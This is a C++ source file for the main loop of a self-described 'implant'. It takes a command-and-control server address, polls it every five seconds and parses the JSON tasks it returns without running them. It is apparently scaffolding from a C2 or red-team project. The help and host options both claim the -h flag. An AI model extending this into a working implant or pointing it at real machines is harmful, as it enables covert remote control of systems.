/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#include "implant.h"
#include <boost/program_options.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#include <sstream>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>



int main(int argc, char** argv) {
  using namespace boost::program_options;
  bool is_help{};

  options_description description{ "implant [options]" };
  description.add_options()("help,h", bool_switch(&is_help), "display a help dialog")(
      "host,h", value<std::string>()->default_value("localhost"), "hostname or IP address of CNC server")(
      "service,s", value<std::string>()->default_value("http"), "service (HTTP/HTTPS) or port of CNC server");

  variables_map vm;
  try {
    store(parse_command_line(argc, argv, description), vm);
    notify(vm);
  } catch(std::exception& e) {
    std::cerr << e.what() << "\n";
    return -1;
  }

  if(is_help) {
    std::cout << description;
    return 0;
  }
  if(vm["host"].empty() || vm["service"].empty()) {
    std::cerr << "You must provide a command and control server.\n";
    return -1;
  }
  const auto host = vm["host"].as<std::string>();
  const auto service = vm["service"].as<std::string>();

  boost::asio::io_context io_context;
  try {
    while(true) {
      boost::property_tree::ptree tasks;
      try {
        const auto response = make_request(host, service, R"({"key": "value"})", io_context);
        std::cout << response << "\n";
        std::stringstream ss{response};
        boost::property_tree::read_json(ss, tasks);
        for(const auto& [task_tree_key, task_tree_value] : tasks) {
          const auto task = parse_task_from(task_tree_value);
        }
      } catch(const std::exception& e) {
        std::cerr << e.what() << std::endl;
      }
      std::this_thread::sleep_for(std::chrono::seconds{ 5 });
    }

  } catch(boost::system::system_error& se) {
    std::cerr << "Error: " << se.what() << std::endl;
  }
}
